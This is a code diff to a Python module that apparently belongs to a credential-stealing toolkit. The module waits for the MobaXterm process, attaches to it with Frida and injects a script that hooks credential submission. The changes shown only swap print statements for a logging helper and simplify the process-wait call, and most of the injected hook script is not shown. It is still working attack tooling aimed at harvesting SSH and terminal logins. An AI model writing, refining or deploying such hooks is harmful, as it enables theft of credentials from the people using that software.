@@ -1,16 +1,22 @@
-from PyHook import wait_for_process, on_credential_submit
+from PyHook import wait_for_process, on_credential_submit, log
 import frida
+
+hook_process_name = "mobaxterm"
+
+
+def logger(message):
+    log(hook_process_name, message)
 
 
 def wait_for():
-    wait_for_process(["MobaXterm.exe"], "MobaXterm", hook)
+    wait_for_process(["MobaXterm.exe"], hook)
 
 
 def hook(pid):
     try:
-        print("[ mobaxterm-hook ] Trying To Attach To MobaXterm")
+        logger("Trying To Hook Into MobaXterm")
         session = frida.attach(pid)
-        print(f"[ mobaxterm-hook ] Attached to MobaXterm pid {pid}!")
+        logger(f"Hooked MobaXterm With PID {pid}")
         script = session.create_script("""
 
 		var creds;
@@ -41,5 +47,5 @@ def hook(pid):
         script.load()
 
     except Exception as e:
-        print("[ mobaxterm-hook ] Unhandled exception: " + str(e))
-        print("[ mobaxterm-hook ] Continuing...")
+        logger("Unhandled exception: " + str(e))
+        logger("Continuing...")
